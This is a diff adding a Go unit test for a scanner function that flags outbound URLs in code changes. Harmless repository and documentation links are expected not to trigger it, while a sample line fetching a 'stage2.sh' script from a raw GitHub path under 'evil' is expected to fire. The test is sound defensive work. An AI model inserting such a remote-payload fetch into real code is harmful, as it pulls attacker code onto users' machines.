@@ -115,3 +115,20 @@ func TestIsHighEntropy(t *testing.T) {
 		})
 	}
 }
+
+func TestGrepOutboundURLsFiltersNoise(t *testing.T) {
+	old := `const x = 1`
+
+	noise := `const x = 1
+	  "repository": "https://github.com/owner/repo.git"
+	  // see https://github.com/owner/repo/issues/487
+	  // docs https://nodejs.org/docs/latest-v26.x/api/errors.html#class-error`
+	if sigs := grepOutboundURLs(old, noise); len(sigs) != 0 {
+		t.Errorf("repo/issue/doc URLs should not fire, got %d: %+v", len(sigs), sigs)
+	}
+
+	payload := `const x = 1; fetch("https://raw.githubusercontent.com/evil/repo/main/stage2.sh")`
+	if sigs := grepOutboundURLs(old, payload); len(sigs) != 1 || sigs[0].Weight != 4 {
+		t.Errorf("raw payload host should fire at weight 4, got %+v", sigs)
+	}
+}
